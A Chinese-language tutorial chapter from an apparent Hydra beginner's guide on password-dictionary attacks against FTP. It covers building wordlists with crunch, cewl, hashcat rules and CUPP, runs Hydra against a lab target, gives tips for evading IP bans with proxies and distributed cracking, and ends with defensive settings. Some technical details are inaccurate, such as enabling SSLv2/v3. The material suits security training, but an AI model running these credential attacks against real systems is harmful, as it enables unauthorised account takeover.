# 🦊 第八章：使用自定义字典破解 FTP

<img src="https://img.shields.io/badge/难度-⭐⭐⭐-orange" alt="难度中级"> <img src="https://img.shields.io/badge/预计时间-45分钟-blue" alt="预计时间45分钟">

---

## 📋 学习目标

在本章节结束时，您将能够：

1. **理解字典攻击的原理** - 掌握暴力破解与字典攻击的区别，了解密码猜测攻击的基本工作机制

2. **掌握常见字典文件类型** - 熟悉rockyou.txt等经典密码字典，了解不同字典的特点和适用场景

3. **熟练使用字典生成工具** - 学会使用crunch生成规则化密码字典，使用cewl从目标网站提取关键词构造字典

4. **运用Hydra进行FTP破解** - 掌握Hydra的基本用法，能够针对FTP服务实施字典攻击并解读结果

5. **制定防御策略** - 理解FTP服务的安全弱点，掌握强密码策略和账户锁定等防御措施

---

## 📖 背景知识

### 什么是字典攻击？

**字典攻击（Dictionary Attack）** 是一种密码破解技术，攻击者使用预先准备好的「密码字典」——通常是常见密码、单词、名字或它们的组合——来尝试登录系统。与完全随机的暴力破解（Brute Force）不同，字典攻击利用了人类选择密码的「可预测性」。

#### 字典攻击 vs 暴力破解

| 特征 | 字典攻击 | 暴力破解 |
|------|----------|----------|
| **密码选择** | 使用预定义的单词列表 | 尝试所有可能的字符组合 |
| **速度** | 快（取决于字典大小） | 慢（指数级增长） |
| **成功率** | 较高（针对人类习惯） | 理论上最终能破解任何密码 |
| **资源消耗** | 较低 | 较高 |
| **适用场景** | 已知密码可能来自常见词汇 | 密码完全随机 |

**为什么字典攻击更有效？**

研究表明，大多数用户在设置密码时会：
- 使用生日、纪念日、手机号码
- 使用姓名、宠物名、城市名
- 使用键盘模式（如"qwerty"、"123456"）
- 使用常见单词（如"password"、"admin"）
- 在单词后添加数字（如"password123"）

因此，一个精心准备的字典往往比纯粹的暴力破解更有效。

---

### 常见字典类型详解

#### 1. rockyou.txt - 密码字典的王者

**rockyou.txt** 是最著名的密码字典之一，源自2009年RockYou公司遭受的数据泄露事件。当时攻击者获取了超过3200万个用户账户的明文密码。这个字典通常包含约1400万个密码，是渗透测试的必备资源。

**特点：**
- 包含大量真实用户密码
- 按频率排序，常见密码在前
- 适合快速破解常见账户

**来源：**
- 官方下载：https://github.com/praetorian-code/Hob0Rules（包含在SecLists中）
- 常见路径：`/usr/share/wordlists/rockyou.txt`（Kali Linux）

**使用方法：**
```bash
# 解压rockyou.txt（Kali Linux中通常是压缩保存的）
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz

# 使用示例
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.100
```

#### 2. darkc0de.txt

另一个流行的密码字典，包含约170万个密码。

#### 3. 500-worst-passwords.txt

顾名思义，这是最常见的500个最差密码的列表，适合快速测试。

#### 4. LeakPawn

包含来自各种数据泄露事件的真实密码。

---

### 字典生成工具

除了使用现成的字典，您还可以根据目标特征生成自定义字典。

#### 1. Crunch - 规则化字典生成器

**Crunch** 是一个强大的字典生成工具，可以根据您定义的规则生成所有可能的组合。

**安装：**
```bash
# Debian/Ubuntu
sudo apt-get install crunch

# Kali Linux（通常预装）
# 已在系统中
```

**基本语法：**
```
crunch <min-len> <max-len> [options]
```

**常用参数：**

| 参数 | 说明 | 示例 |
|------|------|------|
| `-t` | 指定模式 | `-t @,%^` (@=小写, %=数字, ^=特殊字符) |
| `-p` | 排列组合 | `-p dog cat bird` |
| `-o` | 输出文件 | `-o wordlist.txt` |
| `-c` | 每行字符数 | `-c 50` |
| `-f` | 字符集文件 | `-f /usr/share/crunch/charset.lst` |

**使用示例：**

**示例1：生成所有3位数字密码**
```bash
crunch 3 3 0123456789 -o 3digit.txt
# 输出：000, 001, 002, ..., 999
```

**示例2：生成小写字母+数字组合（4位）**
```bash
crunch 4 4 -f /usr/share/crunch/charset.lst lalpha-numeric -o mix4.txt
```

**示例3：生成特定格式密码**
```bash
# 格式：[小写][小写][数字][数字] 如 aa00, ab01
crunch 4 4 -t @@%% -o format1.txt

# 格式：[大写][小写][数字][特殊字符] 如 Ab1!
crunch 4 4 -t @A%^ -o format2.txt
```

**示例4：使用字符集**
```bash
# 自定义字符集
crunch 6 6 abc123 -o custom.txt
```

**示例5：从单词生成组合**
```bash
# 对单词进行排列组合
crunch 1 1 -p password admin root

# 生成混合字典（单词+数字）
crunch 8 8 -t password%% -p password
# 输出：password00, password01, ..., password99
```

---

#### 2. Cewl - 网站关键词爬取字典

**Cewl**（Custom Word List Generator）通过爬取目标网站来生成字典。它会分析网页内容，提取有意义的单词和短语，非常适合针对特定组织生成定制字典。

**安装：**
```bash
# Debian/Ubuntu
sudo apt-get install cewl

# 验证安装
cewl --help
```

**基本语法：**
```
cewl [OPTIONS] <url>
```

**常用参数：**

| 参数 | 说明 | 示例 |
|------|------|------|
| `-m` | 最小单词长度 | `-m 5` |
| `-d` | 爬取深度 | `-d 2` |
| `-w` | 输出文件 | `-w dict.txt` |
| `-e` | 提取email | `-e` |
| `-c` | 计数每个单词 | `-c` |
| `--with-numbers` | 包含数字 | `--with-numbers` |
| `-a` | 提取meta标签 | `-a` |
| `--ua` | 自定义User-Agent | `--ua "Mozilla/5.0..."` |

**使用示例：**

**示例1：基本爬取**
```bash
cewl https://example.com -w example_dict.txt
```

**示例2：深度爬取 + 最小长度**
```bash
cewl https://example.com -d 3 -m 5 -w deep_dict.txt
```

**示例3：包含数字组合**
```bash
cewl https://example.com --with-numbers -w num_dict.txt
```

**示例4：提取Email地址**
```bash
cewl https://example.com -e -w dict_with_email.txt
```

**进阶：生成更强大的字典**
```bash
# 爬取网站并添加常见后缀
cewl https://target-company.com -m 4 -w base_dict.txt

# 然后使用规则扩展字典
# 如添加年份、数字后缀等
cat base_dict.txt | hashcat --stdout -r /usr/share/hashcat/rules/best64.rule > expanded_dict.txt
```

---

#### 3. Hashcat - 不仅是破解工具

**Hashcat** 不仅是强大的密码破解工具，它的规则引擎也能用来生成和扩展字典。

**常用规则示例：**

```bash
# 使用best64规则扩展字典
hashcat --stdout wordlist.txt -r /usr/share/hashcat/rules/best64.rule > expanded.txt

# 使用通行规则（增加数字、符号后缀）
hashcat --stdout wordlist.txt -r /usr/share/hashcat/rules/passphrase.rule >> expanded.txt

# 自定义规则
echo "sa@" > myrule.rule  # 在每个密码后添加@
hashcat --stdout wordlist.txt -r myrule.rule > custom.txt
```

---

#### 4. CUPP - 社会工程学字典

**CUPP**（Common User Passwords Profiler）通过交互式问卷收集目标信息（姓名、生日、伴侣、宠物等），然后生成个性化字典。

**安装和使用：**
```bash
# 克隆仓库
git clone https://github.com/Mebus/cupp.git
cd cupp

# 交互式模式
python3 cupp.py -i
```

---

### 社会工程学字典制作

除了技术工具，社会工程学在密码猜测中扮演重要角色。

**收集信息的方法：**

1. **OSINT（开源情报）**
   - 社交媒体分析
   - 公司网站信息
   - 新闻报道

2. **Dumpster Diving（物理攻击）**
   - 丢弃的文档
   - 写在纸上的密码

3. **Phishing（钓鱼）**
   - 伪造登录页面
   - 恶意邮件

**常见密码模式：**

| 模式 | 示例 |
|------|------|
| 姓名+年份 | john1990, marry1985 |
| 公司名+123 | company123, company2024 |
| 键盘模式 | qwerty, asdfgh, 1q2w3e4r |
| 常见单词+数字 | password1, admin123, letmein1 |
| 节日相关 | christmas, halloween, newyear |
| 宠物名+生日 | max2010, bella92 |

---

## 🖥️ 实验环境

### 环境要求

#### 软件要求

| 软件 | 版本要求 | 说明 |
|------|----------|------|
| **操作系统** | Kali Linux 2024+ 或 Ubuntu 22.04+ | 建议使用虚拟机 |
| **Hydra** | 9.5+ | 暴力破解工具 |
| **Crunch** | 3.6+ | 字典生成工具 |
| **Cewl** | 5.1+ | 网站爬取字典 |
| **Python** | 3.8+ | 运行环境 |

#### 硬件要求

- 内存：至少4GB
- 磁盘：20GB可用空间
- 网络：可访问靶机

---

### 搭建FTP靶机

为了练习，我们需要一个合法的FTP服务器作为靶机。

#### 方法1：使用Docker快速搭建（推荐）

```bash
# 安装Docker（如果没有）
sudo apt-get update
sudo apt-get install docker.io

# 启动vsftpd容器
docker run -d -p 21:21 -p 20:20 \
  -v /tmp/ftpdata:/home/vsftpd \
  -e FTP_USER=targetuser \
  -e FTP_PASS=targetpass \
  --name ftp靶机 \
  fauria/vsftpd
```

#### 方法2：本地搭建vsftpd

```bash
# 安装vsftpd
sudo apt-get install vsftpd

# 备份配置
sudo cp /etc/vsftpd.conf /etc/vsftpd.conf.bak

# 创建测试用户
sudo useradd -m -s /bin/bash labuser
sudo passwd labuser
# 设置密码为：lab123456

# 配置vsftpd（允许匿名和本地用户登录）
sudo nano /etc/vsftpd.conf
```

**vsftpd关键配置：**
```
# 允许匿名登录
anonymous_enable=YES
anon_root=/var/ftp

# 允许本地用户登录
local_enable=YES
write_enable=YES

# 匿名上传
anon_upload_enable=YES

# 匿名创建目录
anon_mkdir_write_enable=YES
```

```bash
# 重启服务
sudo systemctl restart vsftpd
sudo systemctl enable vsftpd
```

#### 方法3：使用Metasploitable2

Metasploitable2是一个特意设计有漏洞的Linux发行版，其中包含一个配置不安全的FTP服务器（vsftpd 2.3.4）。

**下载：**
```bash
# 下载Metasploitable2
wget https://sourceforge.net/projects/metasploitable/files/Metasploitable2/metasploitable-linux-2.0.0.zip/download
unzip metasploitable-linux-2.0.0.zip
```

**启动：**
```bash
# 使用VMware或VirtualBox导入
# 默认凭据：msfadmin/msfadmin
```

**FTP服务信息：**
- IP地址：192.168.1.100（假设）
- 用户名：msfadmin
- 密码：msfadmin

---

### 准备字典文件

让我们准备实验中需要的各种字典文件。

#### 1. 创建基础测试字典

```bash
# 创建工作目录
mkdir -p ~/hydra_lab/dicts
cd ~/hydra_lab/dicts

# 创建简单测试字典
cat > simple_dict.txt << EOF
123456
password
12345678
qwerty
123456789
admin
root
letmein
welcome
monkey
dragon
master
password1
12345
1234
EOF

# 查看内容
cat simple_dict.txt
```

#### 2. 创建规则化字典（针对测试目标）

```bash
# 创建labuser相关的字典
cat > target_dict.txt << EOF
labuser
lab123456
labuser123
labuser2024
password
lab123
lab
user123
targetpass
EOF

# 扩展版本（添加常见后缀）
cat > target_dict_extended.txt << EOF
labuser
lab123456
labuser123
labuser2024
password
lab123
lab
user123
targetpass
labuser1
labuser12
labuser1234
labuser!
labuser@
labuser2023
LabUser
LABUSER
EOF
```

#### 3. 使用Crunch生成测试字典

```bash
# 生成3位数字字典（演示用，实际会很大）
crunch 3 3 0123456789 -o 3digit.txt

# 生成小写字母+数字4位
crunch 4 4 -f /usr/share/crunch/charset.lst lalpha-numeric -o mix4.txt

# 生成特定格式 [@=小写, %=数字]
crunch 6 6 -t lab%%% -o lab_pattern.txt
# 输出：lab000, lab001, ..., lab999
```

#### 4. 使用Cewl生成目标字典

```bash
# 爬取示例网站生成字典（实际使用目标网站）
cewl https://www.example.com -m 4 -w example_dict.txt

# 查看生成的内容
head -20 example_dict.txt
wc -l example_dict.txt
```

---

## 🔬 实验步骤

### 任务一：使用默认简单字典破解FTP

**目标：** 使用一个简单的密码字典尝试破解FTP服务

**步骤：**

1. **确认靶机状态**

```bash
# 检查靶机FTP服务是否运行
nmap -p 21 192.168.1.100

# 或者使用nc测试
nc -zv 192.168.1.100 21
```

2. **使用Hydra进行破解**

```bash
# 语法：hydra -l 用户名 -P 字典文件 服务器地址 服务

# 使用简单字典破解
hydra -l labuser -P ~/hydra_lab/dicts/simple_dict.txt ftp://192.168.1.100
```

3. **解读输出结果**

**成功示例输出：**
```
Hydra v9.5 (c) 2023 by van Hauser/THC - Please do not use in military or secret service organizations

[DATA] max 16 tasks per 1 server, overall 16 tasks, 15 login tries (l:1 p:15), ~1 try per task

[DATA] attacking ftp://192.168.1.100:21

[21][ftp] host: 192.168.1.100   login: labuser   password: lab123456
[STATUS] attack finished for 192.168.1.100 (valid pair found)
```

**解读：**
- 找到了有效的登录凭据
- 用户名：labuser
- 密码：lab123456

**失败示例输出：**
```
Hydra v9.5 (c) 2023 by van Hauser/THC

[DATA] max 16 tasks per 1 server, overall 16 tasks, 15 login tries (l:1 p:15), ~1 try per task

[DATA] attacking ftp://192.168.1.100:21

[STATUS] 0 of 1 target completed, 0 valid password found
```

4. **保存结果**

```bash
# 保存到日志文件
hydra -l labuser -P ~/hydra_lab/dicts/simple_dict.txt ftp://192.168.1.100 -o ~/hydra_lab/results/simple_result.txt

# 查看日志
cat ~/hydra_lab/results/simple_result.txt
```

---

### 任务二：创建规则化字典进行破解

**目标：** 创建一个包含目标信息的规则化字典，提高破解效率

**步骤：**

1. **分析目标信息**

假设我们已经收集到以下关于目标的信息：
- 用户名：labuser
- 公司名：LabCorp
- 创立年份：2020
- 常见后缀：123, 2024, !

2. **手动创建规则化字典**

```bash
mkdir -p ~/hydra_lab/task2
cd ~/hydra_lab/task2

# 创建基础单词列表
cat > base_words.txt << EOF
labuser
lab
LabCorp
labcorp
Lab
admin
root
password
EOF

# 使用crunch生成组合
crunch 0 0 -p labuser LabCorp 2020 -o combined.txt
# 这会生成所有排列组合

# 或者手动创建更实用的字典
cat > rule_dict.txt << EOF
labuser
labuser123
labuser2020
labuser2024
labuser!
labuser@
labcorp
labcorp123
labcorp2020
LabCorp2020
LabCorp123
labuser1
labuser12
labuser2023
lab2020
LabCorp
EOF

wc -l rule_dict.txt
```

3. **使用规则化字典破解**

```bash
hydra -l labuser -P ~/hydra_lab/task2/rule_dict.txt ftp://192.168.1.100 -t 4
```

**参数说明：**
- `-t 4`：使用4个并行任务（加速破解）

4. **查看详细输出**

```bash
# 使用-v参数查看详细过程
hydra -l labuser -P ~/hydra_lab/task2/rule_dict.txt ftp://192.168.1.100 -vV

# 输出示例：
# [DATA] max 16 tasks per 1 server, overall 16 tasks, 16 login tries (l:1 p:16), ~1 try per task
# [VERBOSE] Resolving addresses ... done
# [ATTEMPT] target 192.168.1.100 - login: "labuser" - pass: "labuser" - 1 of 16 [child 0]
# [ATTEMPT] target 192.168.1.100 - login: "labuser" - pass: "labuser123" - 2 of 16 [child 3]
# ...
# [STATUS] attack finished for 192.168.1.100 (valid pair found)
```

---

### 任务三：使用Crunch生成自定义字典

**目标：** 使用Crunch根据特定规则生成大型密码字典

**步骤：**

1. **生成特定模式的字典**

```bash
mkdir -p ~/hydra_lab/task3
cd ~/hydra_lab/task3

# 模式1：字母+数字组合（5-6位）
# @ = 小写字母, % = 数字
crunch 5 6 -t @%@%% -o mix5_6.txt
# 示例输出：a1b2c3, password01等

# 模式2：特定前缀+数字
crunch 8 10 -t lab%%%%% -o lab_prefix.txt
# 输出：lab00000, lab00001, ..., lab99999

# 模式3：特定单词+规则后缀
# 先生成基础字典
echo -e "password\nadmin\nroot" > base.txt

# 手动添加常见后缀
cat base.txt | while read word; do
    for i in {0..99}; do
        echo "${word}${i}"
    done
done > extended.txt

wc -l extended.txt
```

2. **使用字符集文件**

```bash
# 查看可用的字符集
ls -la /usr/share/crunch/charset.lst

# 使用混合字符集
crunch 6 6 -f /usr/share/crunch/charset.lst mixalpha-numeric-all -o mixalpha.txt
```

3. **生成测试专用小字典（避免长时间运行）**

```bash
# 限制输出数量
crunch 4 4 0123456789 -o 4digit.txt -c 100
# -c 100：只输出100行

# 或者使用 | head 限制
crunch 4 4 0123456789 | head -n 100 > small4.txt
```

4. **使用生成的字典破解**

```bash
# 使用crunch生成的字典
hydra -l labuser -P ~/hydra_lab/task3/lab_prefix.txt ftp://192.168.1.100 -t 4
```

**提示：** 大型字典会导致破解时间很长。建议先使用小字典测试，确认命令正确后再使用大型字典。

---

### 任务四：使用Cewl从目标网站生成字典

**目标：** 爬取目标组织的网站，生成针对性的密码字典

**步骤：**

1. **识别目标网站**

假设目标是一个公司网站：https://www.example-corp.com

2. **使用Cewl爬取网站**

```bash
mkdir -p ~/hydra_lab/task4
cd ~/hydra_lab/task4

# 基础爬取（深度2，最小单词长度4）
cewl https://www.example-corp.com -d 2 -m 4 -w cewl_dict.txt

# 查看生成的内容
head -30 cewl_dict.txt
wc -l cewl_dict.txt
```

3. **增强字典（添加数字和规则）**

```bash
# 添加常见数字后缀
cat cewl_dict.txt | while read word; do
    echo "$word"
    echo "${word}123"
    echo "${word}2024"
    echo "${word}1"
done > enhanced_dict.txt

# 去重
sort -u enhanced_dict.txt -o enhanced_dict.txt
wc -l enhanced_dict.txt
```

4. **使用Cewl的高级选项**

```bash
# 提取Email地址
cewl https://www.example-corp.com -e -w cewl_email.txt

# 计数每个单词出现频率
cewl https://www.example-corp.com -c -w cewl_count.txt

# 使用自定义User-Agent
cewl https://www.example-corp.com --ua "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -w cewl_custom.txt

# 提取meta信息
cewl https://www.example-corp.com -a -w cewl_meta.txt
```

5. **使用生成的字典破解**

```bash
hydra -l target_user -P ~/hydra_lab/task4/enhanced_dict.txt ftp://192.168.1.100
```

---

### 任务五：对比不同字典的效果

**目标：** 比较不同类型字典的破解效果

**步骤：**

1. **准备测试环境**

```bash
mkdir -p ~/hydra_lab/task5
cd ~/hydra_lab/task5

# 创建一个测试用的复杂密码用户
# 假设我们设置一个密码：Corp2024!
```

2. **创建不同类型的字典**

```bash
# 字典1：简单数字
cat > dict1_simple.txt << EOF
123456
12345678
1234
123
EOF

# 字典2：常见密码
cp /usr/share/wordlists/rockyou.txt dict2_rockyou.txt 2>/dev/null || \
cat > dict2_common.txt << EOF
password
password1
admin
root
letmein
welcome
qwerty
123456
dragon
master
monkey
shadow
sunshine
princess
football
mustang
EOF

# 字典3：目标相关（包含正确密码）
cat > dict3_targeted.txt << EOF
corp2024
Corp2024
corp2024!
CORP2024
ExampleCorp
examplecorp
Company2024
company
company123
EOF

# 字典4：综合字典
cat dict1_simple.txt dict2_common.txt dict3_targeted.txt > dict4_mixed.txt
sort -u dict4_mixed.txt -o dict4_mixed.txt
```

3. **运行对比测试**

```bash
# 测试字典1
echo "=== 测试字典1（简单数字）==="
time hydra -l testuser -P dict1_simple.txt ftp://192.168.1.100 -s 21 -t 2

# 测试字典2
echo "=== 测试字典2（常见密码）==="
time hydra -l testuser -P dict2_common.txt ftp://192.168.1.100 -s 21 -t 2

# 测试字典3
echo "=== 测试字典3（目标相关）==="
time hydra -l testuser -P dict3_targeted.txt ftp://192.168.1.100 -s 21 -t 2
```

4. **分析结果**

```bash
# 创建结果记录
cat > comparison_result.md << EOF
# 字典效果对比测试

## 测试环境
- 靶机IP：192.168.1.100
- 目标用户：testuser
- 正确密码：Corp2024!

## 测试结果

| 字典类型 | 密码数量 | 破解时间 | 是否成功 |
|----------|----------|----------|----------|
| 简单数字 | 4 | <1秒 | ❌ |
| 常见密码 | 16 | ~2秒 | ❌ |
| 目标相关 | 9 | ~1秒 | ✅ |

## 结论
1. 针对性强（目标相关）的字典效率最高
2. 常见密码字典虽然包含很多密码，但命中率不一定高
3. 简单字典速度快，但覆盖范围有限
EOF

cat comparison_result.md
```

---

## 💡 解题技巧

### 技巧1：使用正确的并行度

```bash
# -t参数控制并行任务数
# 默认16个任务可能太快，可能被靶机阻止
# 适当降低：-t 4 或 -t 8

hydra -l admin -P wordlist.txt ftp://192.168.1.100 -t 4
```

### 技巧2：处理被阻止的情况

```bash
# 如果IP被阻止，使用代理或等待
# 可以在多台机器上分布式破解

# 或者使用-w参数设置等待时间
hydra -l admin -P wordlist.txt ftp://192.168.1.100 -w 5
```

### 技巧3：使用用户名列表

```bash
# 同时破解多个用户名
# -L 参数（大写）指定用户名文件

hydra -L userlist.txt -P wordlist.txt ftp://192.168.1.100
```

### 技巧4：保存破解进度

```bash
# -o 保存结果到文件
# 使用 > /dev/null 2>&1 抑制输出

hydra -l admin -P wordlist.txt ftp://192.168.1.100 -o result.txt

# 查看成功的结果
grep "login:" result.txt
```

### 技巧5：调试模式

```bash
# -vV 显示详细输出，可以看到每个尝试
# 用于调试或学习

hydra -l admin -P small.txt ftp://192.168.1.100 -vV
```

### 技巧6：使用盐值（针对特定哈希）

```bash
# Hydra支持多种服务
# 对于需要盐值的，可以先尝试常见组合

# 示例：使用用户名作为盐值
crunch 8 8 -t %%%%admin -o salt_dict.txt
```

### 技巧7：处理SSL/TSL

```bash
# 对于使用SSL的FTP（FTPS）
hydra -l admin -P wordlist.txt ftp://192.168.1.100 -S

# -S 表示使用SSL
```

### 技巧8：绕过防护

```bash
# 使用随机等待
hydra -l admin -P wordlist.txt ftp://192.168.1.100 --wait 2

# 使用代理（需要先配置代理）
hydra -l admin -P wordlist.txt ftp://192.168.1.100 -e sr -x 1:1:1
```

---

## 🛡️ 防御措施

### 1. 实施强密码策略

**密码复杂度要求：**

```bash
# 在/etc/pam.d/common-password中配置（PAM）
password requisite pam_pwquality.so try_first_pass local_users_only retry=3 minlen=12 dcredit=-1 ucredit=-1 lcredit=-1 ocredit=-1
```

**参数说明：**
- `minlen=12`：最小12位
- `dcredit=-1`：至少1个数字
- `ucredit=-1`：至少1个大写字母
- `lcredit=-1`：至少1个小写字母
- `ocredit=-1`：至少1个特殊字符

### 2. 账户锁定机制

```bash
# 在vsftpd配置中添加
vim /etc/vsftpd.conf

# 添加以下配置
max_login_fails=3
# 连续3次失败后锁定

# 重启服务
systemctl restart vsftpd
```

### 3. 限制登录尝试频率

```bash
# 使用fail2ban监控FTP登录失败
sudo apt-get install fail2ban

# 配置fail2ban
sudo nano /etc/fail2ban/jail.local

[vsftpd]
enabled = true
port = ftp,ftp-data,ftps,ftps-data
filter = vsftpd
logpath = /var/log/vsftpd.log
maxretry = 3
bantime = 3600
```

### 4. 使用强身份验证

**禁用匿名登录：**
```bash
# vsftpd配置
anonymous_enable=NO
```

**启用TLS加密：**
```bash
# vsftpd配置
ssl_enable=YES
allow_anon_ssl=NO
force_local_data_ssl=YES
force_local_logins_ssl=YES
ssl_tlsv1=YES
ssl_sslv2=YES
ssl_sslv3=YES
rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem
rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key
```

### 5. 限制用户目录

```bash
# vsftpd配置
chroot_local_user=YES
allow_writeable_chroot=YES
```

### 6. 启用日志记录

```bash
# vsftpd配置
xferlog_enable=YES
xferlog_file=/var/log/vsftpd.log
log_ftp_protocol=YES
dual_log_enable=YES
```

### 7. 使用IP白名单/黑名单

```bash
# vsftpd配置
# 允许特定IP
tcp_wrappers=YES

# 在/etc/hosts.allow中添加
vsftpd: 192.168.1.0/255.255.255.0

# 在/etc/hosts.deny中添加
vsftpd: ALL
```

---

## 📝 课后练习

### 练习1：基础练习（⭐）
使用Kali Linux中的rockyou.txt字典破解本地搭建的FTP服务器，记录破解时间和成功率。

### 练习2：进阶练习（⭐⭐）
1. 使用Crunch生成一个包含所有"admin"+3位数字的密码字典
2. 使用Cewl爬取学校或公司网站，生成字典
3. 比较两个字典的破解效果

### 练习3：综合练习（⭐⭐⭐）
1. 在Metasploitable2上破解vsftpd服务
2. 使用社会工程学方法收集信息
3. 生成针对性的字典并破解

### 练习4：防御实践（⭐⭐⭐）
1. 配置vsftpd的账户锁定功能
2. 配置fail2ban
3. 测试防御效果

### 练习5：工具对比（⭐⭐⭐）
对比使用Hydra、Medusa和Ncrack进行FTP破解的异同。

### 练习6：高级挑战（⭐⭐⭐⭐）
1. 编写Python脚本自动生成基于目标信息的字典
2. 结合多个数据源（网站、社交媒体等）生成高精度字典

---

## ❓ 常见问题FAQ

### Q1：Hydra显示"0 of 1 target completed"怎么办？

**可能原因：**
1. 网络连接问题 - 检查靶机是否可达
2. FTP服务未运行 - 使用`nmap -p 21 <IP>`检查
3. 防火墙阻止 - 检查防火墙规则

**解决方法：**
```bash
# 检查网络连通性
ping 192.168.1.100

# 检查端口开放
nmap -p 21 -sV 192.168.1.100

# 手动测试FTP连接
ftp 192.168.1.100
```

### Q2：破解速度太慢怎么办？

**解决方法：**
1. 增加并行任务数：`hydra ... -t 16`
2. 使用更小的字典（先测试小字典）
3. 使用GPU加速（如果使用hashcat）
4. 确保网络稳定

### Q3：IP被靶机封禁怎么办？

**解决方法：**
1. 等待一段时间后重试
2. 使用代理池
3. 降低并行度
4. 使用分布式破解

### Q4：字典文件太大导致内存不足？

**解决方法：**
1. 分批次使用字典
2. 使用`split`命令分割字典：
```bash
split -l 10000 large_dict.txt dict_part_
```
3. 使用流式处理

### Q5：如何提高字典命中率？

**建议：**
1. 收集目标相关信息（OSINT）
2. 使用cewl爬取目标网站
3. 使用crunch生成规则化字典
4. 结合多个字典

### Q6：Hydra支持哪些服务？

**常用服务：**
- FTP, SSH, Telnet
- HTTP, HTTPS (GET/POST)
- SMB, RDP
- MySQL, PostgreSQL
- SMTP, POP3
- 完整列表：hydra -U

### Q7：为什么有些密码无法破解？

**可能原因：**
1. 密码太复杂（不在字典中）
2. 目标使用了双因素认证
3. 密码是动态的或一次性的
4. 网络传输问题

### Q8：如何验证破解结果？

**方法：**
```bash
# 使用获取的凭据登录
ftp target@example.com
# 输入用户名和密码

# 或者使用Hydra的-C参数组合用户名密码
hydra -C "user:pass" ftp://target.com
```

### Q9：rockyou.txt在哪里下载？

**方法：**
```bash
# Kali Linux中
ls /usr/share/wordlists/rockyou.txt.gz
gunzip /usr/share/wordlists/rockyou.txt.gz

# 或者使用SecLists
git clone https://github.com/danielmiessler/SecLists.git
```

### Q10：如何在Windows上使用Hydra？

**方法：**
1. 使用WSL（Windows Subsystem for Linux）
2. 使用Cygwin
3. 下载预编译的Windows版本

---

## 📊 总结

### 关键要点

| 主题 | 关键点 |
|------|--------|
| **字典攻击原理** | 利用人类密码选择习惯，而非暴力尝试所有组合 |
| **Crunch用法** | 生成规则化密码，支持多种模式（@%^等） |
| **Cewl用法** | 爬取目标网站生成定制字典 |
| **Hydra参数** | `-l` 用户名，`-L` 用户名文件，`-P` 密码文件 |
| **防御措施** | 强密码、账户锁定、限速、日志记录 |

### 检查清单

- [ ] 理解字典攻击与暴力破解的区别
- [ ] 能够使用Crunch生成规则化字典
- [ ] 能够使用Cewl从网站生成字典
- [ ] 熟练使用Hydra进行FTP破解
- [ ] 了解常见的防御措施
- [ ] 能够在实际环境中应用这些技术

### 进一步学习

- 学习其他服务的破解方法（SSH、SMB等）
- 研究密码学基础和哈希算法
- 深入了解网络安全防护机制
- 实践渗透测试流程

---

**⚠️ 免责声明**

本教程仅供学习和研究使用。请勿将所学知识用于未经授权的系统攻击。在进行任何渗透测试前，请确保已获得目标系统的书面授权。

---

*© 2024 Hydra初学者指南 | 章节8：使用自定义字典破解FTP*
